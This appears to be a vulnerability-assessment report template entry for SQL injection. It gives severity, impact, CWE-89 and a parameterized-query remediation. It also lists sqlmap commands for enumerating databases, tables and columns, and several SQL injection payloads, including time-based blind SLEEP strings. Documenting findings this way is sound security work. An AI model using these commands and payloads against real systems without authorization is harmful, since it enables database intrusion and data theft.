### SQL Injection

| Vulnerability          | SQL Injection                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
|:---------------------- |:-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Severity**           | **HIGH**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **Affected URL**       | <insert the affected url\(s\)>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| **Tools**              | Burp Suite, [SQLmap](https://github.com/gh1mau/vapt/blob/main/poc/sql_injection.md#sqlmap)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Techniques/ Method** | URL Fuzzing, Parameter Tampering                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **Proof of Concept**   | <insert POC screenshot\(s\)>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **Payload\(s\)**       | [List of possible payload](https://github.com/gh1mau/vapt/blob/main/poc/sql_injection.md#possible-payloads)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Description**        | SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **Impact**             | An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| **CVE/CWE/OSVDB**      | CWE-89                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| **Recommendation**     | **Use parameterized queries when dealing with SQL queries that contains user input. Parameterized queries allows the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.**<br/><br/>In order for an SQL injection attack to take place, the vulnerable website needs to directly include user input within an SQL statement. An attacker can then insert a payload that will be included as part of the SQL query and run against the database server.<br/>Parameterized queries are simple to write and understand while forcing a developer to define the entire SQL statement before hand, using placeholders for the actual variables within that statement. A developer would then pass in each parameter to the query afer the SQL statement is defined, allowing the database to be able to distinguish between the SQL command and data inputted by a user. If SQL commands are inputted by an attacker, the parameterized query would treat the input as a string as opposed to an SQL command.<br/>Application developers should avoid sanitizing their input by means of escaping or removing special characters (several encoding tricks an attacker could leverage to bypass such protections) and stick to using parameterized queries in order to avoid SQL injection vulnerabilities. |
| References             | [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)<br/>[Bobby Tables: A guide to preventing SQL injection](https://bobby-tables.com/)<br/>[CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)](https://cwe.mitre.org/data/definitions/89.html)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |

---

### Tools :

#### SQLmap

Reference: [Usage · sqlmapproject/sqlmap Wiki · GitHub](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

```bash
# crawl and pipe to proxy(burp)
$ sqlmap -u "http://localhost" --forms --batch --crawl=10 --level=5 --risk=3
$ sqlmap -r myapps --proxy=http://127.0.0.1:8080 --random-agent --level=5 --risk=3

# time based , mysql dbms
$ sqlmap -r myapps --random-agent --level=5 --risk=3 --dbms=mysql --technique=T

# enumeration(list out databases):
$ sqlmap -r myapps --random-agent --level=5 --risk=3 --dbs

# enumeration(list out tables from sample_db):
sqlmap -r myapps --random-agent --level=5 --risk=3 -D sample_db --tables

# enumeration(list out columns from sample_table from sample_db):
sqlmap -r myapps --random-agent --level=5 --risk=3 -D sample_db -T sample_table --columns
```

---

### Possible Payloads

```sql
-1' OR 3*2*1=6 AND 000666=000666 --

# time-based blind
5555' AND (SELECT 3841 FROM (SELECT(SLEEP(5)))BQTt)-- 

OfoO'||(SELECT 0x77416d57 FROM DUAL WHERE 7899=7899 AND (SELECT 1651 FROM (SELECT(SLEEP(5)))yxfO))
```
